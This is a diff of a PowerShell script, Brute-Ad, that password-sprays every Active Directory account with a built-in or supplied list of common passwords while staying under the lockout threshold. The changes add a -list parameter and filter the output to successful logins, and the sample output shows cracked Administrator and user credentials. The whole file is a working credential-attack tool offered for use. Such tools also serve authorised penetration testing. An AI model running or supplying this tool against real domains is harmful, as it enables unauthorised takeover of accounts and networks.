@@ -1,25 +1,44 @@
-<#
+﻿<#
 .Synopsis
     Brute-forces active directory user accounts based on the password lockout threshold
 .DESCRIPTION
 	Brute-forces active directory user accounts based on the password lockout threshold
 .EXAMPLE
     PS C:\> Brute-Ad
-    Generate a PSObject of results.
+    Bruteforce all accounts in AD with the builtinn list of passwords.
 .EXAMPLE
-	Brute-Ad | Where {$_.IsValid -eq $True}
-	Generate a PSObject of results where the password attempt is successful 
+	Brute-Ad -list password1,password2,'$password$','$Pa55w0rd$'
+	Bruteforce all accounts in AD with a provided list of passwords.
 .EXAMPLE
-	Brute-Ad -Password 'OnePasswordAttempt'
-	Brute-forces active directory user accounts based on the password lockout threshold but stops on a sucessful attempt
+	Brute-Ad -List password1
+    Bruteforce all accounts in AD with just one password.
+.EXAMPLE
+    Brute-Ad -list Password1,password2,'$password$','$Pa55w0rd$',password12345
+    The provided list will be used:  Password1 password2 $password$ $Pa55w0rd$ password12345
+
+
+    Username        Password   IsValid
+    --------        --------   -------
+    {Administrator} $Pa55w0rd$ True   
+    {jdoe}          Password1  True
 #>
-function Brute-Ad ($Password)
+function Brute-Ad
 {
-    if ($Password) {
-        $allpasswords = @("$Password")
-    } else {
+[cmdletbinding()]
+Param
+(
+		[string[]]$list
+)
+    if ($list)
+        {
+        $allpasswords = $list
+        Write-Host -ForegroundColor Yellow 'The provided list will be used: '$allpasswords`n
+        }
+        else
+        {
         $allpasswords = @('Password1','password','Password2015','Pa55w0rd','password123','Pa55w0rd1234')
-    }
+        Write-Host -ForegroundColor Yellow 'The built-in list will be used: '$allpasswords`n
+        }
 
 	Function Get-LockOutThreshold  
 	{
@@ -37,7 +56,7 @@ function Brute-Ad ($Password)
 		Add-Type -AssemblyName System.DirectoryServices.AccountManagement
 		$ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
 		$pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ct, $domain)
-		$object = New-Object PSObject | Select Username, Password, IsValid
+		$object = New-Object PSObject | Select-Object -Property Username, Password, IsValid
 		$object.Username = $username;
 		$object.Password = $password;
 		$object.IsValid = $pc.ValidateCredentials($username, $password).ToString();
@@ -70,7 +89,7 @@ function Brute-Ad ($Password)
 	    foreach ($password in $passwords) 
 	    {
 	    	$result = Test-ADCredential $username $password 
-	    	$result
+	    	$result | Where {$_.IsValid -eq $True}
 	    }
 	}
 }
